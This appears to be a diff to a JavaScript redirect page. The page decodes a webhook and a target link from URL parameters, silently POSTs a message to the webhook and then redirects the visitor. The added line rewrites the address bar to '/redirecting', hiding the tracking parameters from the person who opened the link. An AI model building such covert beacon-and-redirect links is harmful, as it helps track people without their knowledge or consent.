@@ -66,7 +66,7 @@
         });
 
         // Check if the page is loaded with parameters
-        window.onload = function() {
+        window.onload = function () {
             const urlParams = new URLSearchParams(window.location.search);
             const encodedWebhook = urlParams.get('w');
             const encodedLink = urlParams.get('l');
@@ -74,6 +74,9 @@
             // Ensure both parameters are present
             if (encodedWebhook && encodedLink) {
                 try {
+                    // Update the browser's address bar (visual change only)
+                    history.replaceState({}, null, '/redirecting');
+
                     // Decode Webhook and Link separately
                     const webhook = base64Decode(encodedWebhook);
                     const link = base64Decode(encodedLink);
@@ -112,7 +115,7 @@
                                 headers: {
                                     'Content-Type': 'application/json',
                                 },
-                                body: JSON.stringify(message),  
+                                body: JSON.stringify(message),
                             });
                         })
                         .then(response => {
@@ -128,7 +131,7 @@
                             // Redirect to the decoded link
                             setTimeout(() => {
                                 window.location.href = link;
-                            }, 500);  // Delay to allow the webhook to be sent
+                            }, 500); // Delay to allow the webhook to be sent
                         });
 
                 } catch (error) {
